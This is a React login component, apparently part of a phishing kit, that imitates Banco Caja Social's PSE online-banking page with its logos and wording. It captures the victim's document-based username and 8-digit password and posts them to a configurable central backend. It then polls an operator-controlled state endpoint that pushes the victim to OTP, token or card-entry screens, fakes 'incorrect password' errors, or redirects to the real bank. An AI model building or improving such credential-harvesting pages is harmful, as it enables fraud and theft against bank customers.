import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { updateStateSession } from "../../../../../../@utils";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingCajaSocial from "../../../../../components/LoadingCajaSocial";
import logoBancoFundacion from "../../img/logo_banco_fundacion.svg";
import pseLogoCirculo from "../../img/pse_logo_circulo.svg";
import heroBg from "../../img/bg-1.png";
import "./login_caja_social_pse.css";

// Se inicializan las constantes de configuración
const HERO_BG = heroBg;
const TIPOS = ["CC", "CE", "NI", "TI", "PE"];

const CAJA_SOCIAL_DOC_RULES = {
  CC: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de ciudadanía debe tener entre 6 y 10 dígitos.",
  },
  CE: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de extranjería debe tener entre 6 y 10 dígitos.",
  },
  NI: {
    maxLen: 10,
    test: (n) => /^\d{9,10}$/.test(n),
    hint: "El NIT debe tener 9 o 10 dígitos.",
  },
  TI: {
    maxLen: 11,
    test: (n) => /^\d{10,11}$/.test(n),
    hint: "La tarjeta de identidad debe tener 10 u 11 dígitos.",
  },
  PE: {
    maxLen: 15,
    test: (n) => /^\d{6,15}$/.test(n),
    hint: "El permiso especial de permanencia debe tener entre 6 y 15 dígitos.",
  },
};

const parseCajaSocialUsuario = (value) => {
  const normalized = String(value || "").trim().toUpperCase();
  const tipo = TIPOS.find((t) => normalized.startsWith(t)) || null;
  return {
    tipo,
    numero: tipo ? normalized.slice(tipo.length) : "",
  };
};

const sanitizeCajaSocialUsuarioInput = (raw) => {
  const upper = String(raw || "").toUpperCase().replace(/[^A-Z0-9]/g, "");
  const { tipo, numero } = parseCajaSocialUsuario(upper);

  if (tipo) {
    const maxLen = CAJA_SOCIAL_DOC_RULES[tipo]?.maxLen ?? 15;
    return tipo + numero.replace(/\D/g, "").slice(0, maxLen);
  }

  return upper.replace(/[^A-Z]/g, "").slice(0, 2);
};

const getCajaSocialDocumentError = (tipo, numero) => {
  if (!tipo) return null;
  if (numero === "") return null;
  if (!/^\d+$/.test(numero)) {
    return "El número de identificación solo debe contener dígitos.";
  }

  const rule = CAJA_SOCIAL_DOC_RULES[tipo];
  if (!rule) return null;
  return rule.test(numero) ? null : rule.hint;
};

const CS_ERROR_KEY = "caja_social_error_modal";
const CS_LOGIN_ERROR_AUTO_HIDE_MS = 5000;
const CS_LOGIN_ERROR_TITLE = "Usuario o contraseña incorrectas";
const CS_LOGIN_ERROR_BODY = "Por favor verifique sus datos e intente de nuevo.";

// Se inicializa la clave del mid flow
const CS_MID_FLOW_KEY = "caja_social_mid_flow";

// Se inicializan los mensajes del modal
const MODAL_MSG = {
  error_otp: "El código OTP no es válido. Intente nuevamente.",
  error_token: "El token ingresado no es válido. Intente nuevamente.",
  block_ip: "Acceso bloqueado por seguridad.",
};

// Se inicializan los estados a ignorar despues del modal
const ESTADOS_IGNORAR_TRAS_MODAL = ["error_login", "error_otp", "error_token"];

// Se crea el componente
export default function LoginCajaSocial() {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan las referencias
  const sessionIdRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Se inicializan los estados de UI y formulario
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState("usuario");
  const [value, setValue] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [touched, setTouched] = useState(false);
  const [showLoginErrorAlert, setShowLoginErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");

  // Se inicializan las validaciones del formulario
  const isUserStep = step === "usuario";
  const empty = isUserStep ? value.trim() === "" : password.trim() === "";

  // Se validan el prefijo y el formato del usuario (reglas por tipo de documento Colombia)
  const { tipo: docTipo, numero: docNumero } = parseCajaSocialUsuario(value);
  const prefixOk = Boolean(docTipo);
  const documentError = prefixOk ? getCajaSocialDocumentError(docTipo, docNumero) : null;
  const userValid =
    value.trim() !== "" &&
    prefixOk &&
    docNumero !== "" &&
    !documentError;

  // Se valida la contraseña del banco
  const passwordValid = /^\d{8}$/.test(password);
  const valid = isUserStep ? userValid : passwordValid;

  const clearLoginFormFields = () => {
    setValue("");
    setPassword("");
    setStep("usuario");
    setShowPassword(false);
    setTouched(false);
  };

  const dismissLoginErrorAlert = () => {
    setShowLoginErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_login") {
      ignorarEstadoHastaCambioRef.current = "error_login";
      modalBloqueoEstadoRef.current = null;
      sessionStorage.removeItem(CS_MID_FLOW_KEY);
    }
  };

  const showLoginCredentialError = () => {
    stopPolling();
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_login";
    sessionStorage.removeItem(CS_MID_FLOW_KEY);
    clearLoginFormFields();
    setShowLoginErrorAlert(true);
    window.scrollTo(0, 0);
  };

  const dismissLoginErrorAlertIfOpen = () => {
    if (showLoginErrorAlert) {
      dismissLoginErrorAlert();
    }
  };

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se captura el modal pendiente
    const pending = localStorage.getItem(CS_ERROR_KEY);

    // Se valida si el modal pendiente es de login
    if (pending === "error_login") {
      showLoginCredentialError();
    } else if (pending === "error_otp") {

      // Se setea el estado del modal
      modalBloqueoEstadoRef.current = "error_otp";

      // Se muestra el modal de error de OTP
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(MODAL_MSG.error_otp);
    } else if (pending === "error_token") {

      // Se setea el estado del modal
      modalBloqueoEstadoRef.current = "error_token";

      // Se muestra el modal de error de token
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(MODAL_MSG.error_token);
    } else if (pending === "block_ip") {

      // Se setea el estado del modal
      modalBloqueoEstadoRef.current = "block_ip";

      // Se muestra el modal de error de bloqueo de IP
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(MODAL_MSG.block_ip);
    }

    // Se elimina el modal pendiente
    if (pending) localStorage.removeItem(CS_ERROR_KEY);

    // Se captura el handoff desde /pse
    const handoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

    // Se valida si existe handoff
    if (handoff) {

      // Se elimina el handoff y se persiste la sessionId
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se persiste la sessionId
      localStorage.setItem("sessionId", handoff);
    }

    // Se usa siempre la sessionId persistida en localStorage
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se setea el estado del modal
    modalBloqueoEstadoRef.current = pending || null;

    // Se limpia el estado de ignorar
    ignorarEstadoHastaCambioRef.current = null;

    // Se remueve el mid flow
    sessionStorage.removeItem(CS_MID_FLOW_KEY);

    // Se retorna el cleanup
    return () => {

      // Se limpia el intervalo de polling
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, []);

  // Se inicializan los metodos de polling y verificacion
  const initPolling = () => {

    // Se limpia el intervalo anterior si existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se limpia el intervalo de polling
      pollingIntervalRef.current = null;
    }

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se ejecuta una verificacion inmediata
    verifyState();
  };

  // Se para el polling
  const stopPolling = () => {

    // Se valida si existe el intervalo de polling
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se limpia el intervalo de polling
      pollingIntervalRef.current = null;
    }
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/cajasocial/verify-state/${sessionIdRef.current}`);
      const { estado, state, tc, tarjeta, bank } = response.data;
      const currentState = (estado || state || "").toLowerCase();
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

      // Se valida si el estado actual es valido
      if (!currentState) return;

      // Se valida si se debe ignorar el mismo estado tras cerrar el modal
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado actual es el mismo que se debe ignorar
        if (currentState === ignorarEstadoHastaCambioRef.current) {

          // Se sale del if
          return;
        }

        // Se limpia el estado de ignorar
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      // Se valida si el modal actual sigue bloqueando este estado
      if (modalBloqueoEstadoRef.current && currentState === modalBloqueoEstadoRef.current) {

        // Se sale del if
        return;
      }

      // Se ejecuta el switch del estado actual
      switch (currentState) {
        case "sol_otp":

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se actualiza el estado de sesión
            updateStateSession("solicitar_otp");

            // Se redirige a la pantalla OTP Caja Social
            navigate("/banco_caja_social_otp_pse", { replace: true });
          }

          // Se sale del switch
          break;

        case "sol_token":

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se actualiza el estado de sesión
          updateStateSession("sol_token");

          // Se redirige a la pantalla Token Caja Social
          navigate("/banco_caja_social_token_pse", { replace: true });

          // Se sale del switch
          break;
        case "error_login":
          showLoginCredentialError();
          break;
        case "error_otp":

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se setea el error modal
            localStorage.setItem(CS_ERROR_KEY, "error_otp");

            // Se redirige a la pantalla OTP Caja Social
            navigate("/banco_caja_social_otp_pse", { replace: true });
          }

          // Se sale del switch
          break;

        case "error_token":

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se setea el error modal
          localStorage.setItem(CS_ERROR_KEY, "error_token");

          // Se redirige a la pantalla Token Caja Social
          navigate("/banco_caja_social_token_pse", { replace: true });

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se redirige al finalizado TC cuando la sesión viene por tarjeta
          if (isTcSession) {

            // Se redirige al finalizado TC cuando la sesión viene por tarjeta
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige al finalizado PSE cuando la sesión no viene por tarjeta
            navigate("/finalizado-pse", { replace: true });
          }

          // Se sale del switch
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se limpia el storage y se redirige al inicio
          localStorage.clear();

          // Se redirige al inicio
          window.location.href = process.env.REACT_APP_URL_BANK || "/";

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se capturan los datos del error
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se desactiva el loading
        setLoading(false);

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del try catch
        return;
      }

      // Se imprime el error para diagnostico
      console.error("verifyState caja social login", error);
    }
  };

  // Se crea el metodo para cerrar el modal
  const closeModal = () => {

    // Se captura el estado del servidor que abrió el modal
    const estadoServidor = modalBloqueoEstadoRef.current;

    // Se limpia el estado del modal
    modalBloqueoEstadoRef.current = null;

    // Se marca el estado para ignorarlo hasta que cambie
    if (estadoServidor && ESTADOS_IGNORAR_TRAS_MODAL.includes(estadoServidor)) {

      // Se setea el estado de ignorar
      ignorarEstadoHastaCambioRef.current = estadoServidor;
    }

    // Se limpia la UI del formulario
    setShowModal(false);

    // Se limpia el texto del modal
    setModalText("");

    // Se limpia el valor del usuario
    setValue("");

    // Se limpia el valor de la contraseña
    setPassword("");

    // Se actualiza el paso del formulario
    setStep("usuario");

    // Se limpia el estado de tocado
    setTouched(false);
  };

  // Se oculta automáticamente el alerta de login incorrecto
  useEffect(() => {
    if (!showLoginErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissLoginErrorAlert();
    }, CS_LOGIN_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showLoginErrorAlert]);

  // Se crea el metodo para procesar el login
  const handleLogin = async () => {

    // Se valida si la contraseña no es valida o si existe loading
    if (!passwordValid || loading) return;

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que exista la sessionId persistida
    if (!sessionId) {

      // Se muestra el modal de error de sessionId
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se sale del metodo
      return;
    }

    // Se activa el loading
    setLoading(true);

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "usuario": value,
          "clave": password,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/cajasocial/authenticacion",
        },
      },
    };

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa el try catch
    try {

      // Se realiza la petición al backend central o al backend local
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/cajasocial/authenticacion", dataSend);

      // Se valida si la respuesta fue exitosa
      if (response.data?.success) {

        // Se captura la sessionId devuelta por el backend
        const sidResp = response.data.sessionId ?? sessionId;

        // Se persiste la sessionId devuelta por el backend
        localStorage.setItem("sessionId", sidResp);

        // Se setea la sessionId en el ref
        sessionIdRef.current = sidResp;

        // Se setea el mid flow
        sessionStorage.setItem(CS_MID_FLOW_KEY, "1");

        // Se inicia el polling
        initPolling();
      } else {

        // Se desactiva el loading y se muestra el error
        setLoading(false);

        // Se muestra el mensaje de error
        alert("No se pudo establecer la conexión. Intente más tarde.");
      }
    } catch (error) {

      // Se desactiva el loading
      setLoading(false);

      // Se capturan los datos del error
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del try catch
        return;
      }

      // Se muestra el mensaje de error de comunicación
      alert(centralUrl ? "Error de comunicación con el servidor central." : "Error de comunicación con el servidor. Verifique que el backend esté en ejecución."
      );
    }
  };

  // Se crea el metodo para avanzar al paso de contraseña
  const goToPasswordStep = () => {

    // Se valida que el usuario sea valido
    if (!userValid) return;

    dismissLoginErrorAlertIfOpen();

    // Se actualiza la UI del formulario
    setStep("contrasena");
    setShowPassword(false);
    setTouched(false);
  };

  // Se crea el metodo para regresar al paso de usuario
  const backToUserStep = () => {

    // Se actualiza la UI del formulario
    setStep("usuario");
    setShowPassword(false);
    setTouched(false);
  };

  // Se retorna el HTML
  return (
    <div className="bcs-layout lcsp-screen">

      {/* Loading overlay mientras se envia o se espera cambio de estado */}
      {loading ? <LoadingCajaSocial /> : null}

      {/* Columna izquierda con imagen de apoyo */}
      <div className="bcs-image">
        <img
          className="bcs-image-media"
          src={HERO_BG}
          alt=""
          aria-hidden="true"
        />
      </div>

      {/* Columna derecha con logos y formulario */}
      <div className="bcs-form">

        {/* Bloque de logos institucionales */}
        <div className="login-logos-wrapper lcsp-login-logos">
          <div className="identity-logo">
            <img src={logoBancoFundacion} alt="Banco Caja Social y Fundación Grupo Social" className="lcsp-img-banco" />
          </div>
          <div id="pse-logo" className="pse-logo">
            <img src={pseLogoCirculo} alt="PSE" className="lcsp-img-pse" />
          </div>
        </div>

        <div className="lcsp-hero-text">
          <header>
            <h1 id="kc-page-title">
              Bienvenido al Portal{" "}
              <span className="lcsp-title-personas">Personas</span>
            </h1>
          </header>

          {showLoginErrorAlert ? (
            <div className="cs-login-alert alert alert-danger" role="alert">
              <div className="cs-login-alert__row">
                <span className="cs-login-alert__icon" aria-hidden="true">!</span>
                <strong className="cs-login-alert__title">{CS_LOGIN_ERROR_TITLE}</strong>
              </div>
              <p className="cs-login-alert__text">{CS_LOGIN_ERROR_BODY}</p>
            </div>
          ) : null}

          {/* Texto contextual del paso actual */}
          <p className="lcsp-instruction-body">
            {isUserStep ? (
              <>
                Recuerde que su usuario está compuesto por su Tipo de
                Identificación <b>(CC, CE, NI, TI, PE)</b> y su Número de
                Identificación sin espacios, puntos ni comas.
              </>
            ) : (
              <>
                Ingrese su contraseña de canales digitales, recuerde que está
                compuesta por 8 caracteres.
              </>
            )}
          </p>
        </div>

        {/* Formulario principal de acceso */}
        <form
          className="bb-form"
          onSubmit={(e) => {

            // Se previene el submit nativo del formulario
            e.preventDefault();
          }}
        >

          {/* Campo principal del paso actual */}
          <div className="bb-form-field--md">
            <label className="label" htmlFor="lcsp-user">
              {isUserStep ? "Usuario" : "Contraseña"}
            </label>

            {/* Input de usuario */}
            {isUserStep ? (
              <input
                id="lcsp-user"
                className="form-control"
                type="text"
                value={value}
                onChange={(e) => {

                  // Se actualiza el usuario en mayúsculas y solo caracteres válidos
                  setValue(sanitizeCajaSocialUsuarioInput(e.target.value));

                  // Se marca el campo como tocado
                  setTouched(true);

                  dismissLoginErrorAlertIfOpen();
                }}
                autoComplete="off"
              />
            ) : (

              /* Input de contraseña con toggle visual */
              <div className="lcsp-password-field">
                <input
                  id="lcsp-user"
                  type={showPassword ? "text" : "password"}
                  className="form-control"
                  value={password}
                  onChange={(e) => {

                    // Se actualiza la contraseña numerica
                    setPassword(e.target.value.replace(/\D/g, "").slice(0, 8));

                    // Se marca el campo como tocado
                    setTouched(true);
                  }}
                  autoComplete="off"
                  inputMode="numeric"
                  maxLength={8}
                  style={{
                    WebkitTextSecurity: showPassword ? "none" : "disc",
                  }}
                />
                <button
                  type="button"
                  className="lcsp-password-toggle"
                  onClick={() => {

                    // Se alterna la visualización de la contraseña
                    setShowPassword((prev) => !prev);
                  }}
                  aria-label={showPassword ? "Ocultar contraseña" : "Mostrar contraseña"}
                >
                  {showPassword ? (
                    <svg viewBox="0 0 16 16" className="lcsp-password-toggle-icon" aria-hidden="true">
                      <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5S11.879 4.668 13.168 5.957A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13.133 13.133 0 0 1 1.172 8z" />
                      <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z" />
                    </svg>
                  ) : (
                    <svg viewBox="0 0 16 16" className="lcsp-password-toggle-icon" aria-hidden="true">
                      <path d="M13.359 11.238 15.646 13.5l-.708.708-2.189-2.164A8.886 8.886 0 0 1 8 13.5C3 13.5 0 8 0 8a17.634 17.634 0 0 1 3.127-3.88L.354 1.354.354.646l14 14-.708.708-.287-.287zM4.03 5.03A12.607 12.607 0 0 0 1.173 8c.058.087.122.183.195.288.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c1.18 0 2.25-.305 3.2-.825l-1.51-1.495A3.5 3.5 0 0 1 5.82 6.31L4.03 5.03zM10.79 8.527l-3.317-3.286A2.5 2.5 0 0 1 10.79 8.527z" />
                      <path d="M13.359 10.518A17.634 17.634 0 0 0 16 8s-3-5.5-8-5.5c-1.03 0-1.992.18-2.87.5l.837.829A7.89 7.89 0 0 1 8 3.5c2.12 0 3.88 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.315.47-.773 1.093-1.469 1.74z" />
                    </svg>
                  )}
                </button>
              </div>
            )}

            {/* Ejemplo de formato para el usuario */}
            {isUserStep ? (
              <small className="bb-username-example">
                Ejemplo: CC1234567890
              </small>
            ) : null}

            {/* Mensaje de campo obligatorio */}
            {touched && empty && (
              <small className="bb-input-validation-message">
                Campo obligatorio.
              </small>
            )}

            {/* Mensaje de validación del prefijo del usuario */}
            {isUserStep && touched && !empty && !prefixOk && (
              <small className="bb-input-validation-message">
                Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.
              </small>
            )}

            {/* Mensaje de validación del número según tipo de documento */}
            {isUserStep && touched && prefixOk && documentError && (
              <small className="bb-input-validation-message">
                {documentError}
              </small>
            )}

            {/* Mensaje de validación de la contraseña */}
            {!isUserStep && touched && !empty && !passwordValid && (
              <small className="bb-input-validation-message">
                Datos incorrectos. Verifique la longitud de su contraseña.
              </small>
            )}

          </div>

          {/* Acciones del formulario */}
          <div className="lcsp-actions-row bb-block bb-block--xl mt-3">
            <button
              type="button"
              className={`lcsp-btn lcsp-btn-cancelar ${!isUserStep ? "lcsp-btn-volver" : ""}`}
              onClick={isUserStep ? () => {

                // Se deja el botón cancelar sin acción en el primer paso
              } : backToUserStep}
            >
              {isUserStep ? "Cancelar" : "Volver"}
            </button>
            <button
              type="button"
              className="lcsp-btn lcsp-btn-siguiente"
              disabled={!valid || loading}
              onClick={isUserStep ? goToPasswordStep : handleLogin}
            >
              {loading ? "Cargando..." : (isUserStep ? "Siguiente" : "Iniciar sesión")}
            </button>
          </div>
        </form>
      </div>

      {/* Modal de errores y bloqueos */}
      {showModal ? (
        <div className="cs-modal-overlay" role="presentation">
          <div className="cs-modal-card" role="dialog" aria-modal="true">
            <div className="cs-modal-top">Caja Social</div>
            <div className="cs-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="cs-modal-bot">
              <button type="button" className="cs-modal-accept" onClick={closeModal}>
                Aceptar
              </button>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}